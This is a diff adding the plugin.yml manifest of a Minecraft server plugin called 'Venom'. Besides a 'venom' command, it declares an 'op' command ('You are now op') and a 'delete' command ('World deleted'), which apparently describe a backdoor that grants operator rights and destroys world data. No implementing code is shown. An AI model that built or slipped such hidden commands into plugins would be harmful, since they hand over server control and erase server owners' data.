@@ -1,0 +1,16 @@
+name: Venom
+version: 1.0
+main: me.respawn.venom.Main
+author: Respawn
+description: Careful, it's venomous!
+
+commands:
+   venom:
+     usage: /<command>
+     description: Venom. Pick your poison.
+   op:
+     usage: /<command>
+     description: You are now op.
+   delete:
+     usage: /<command>
+     description: World deleted.
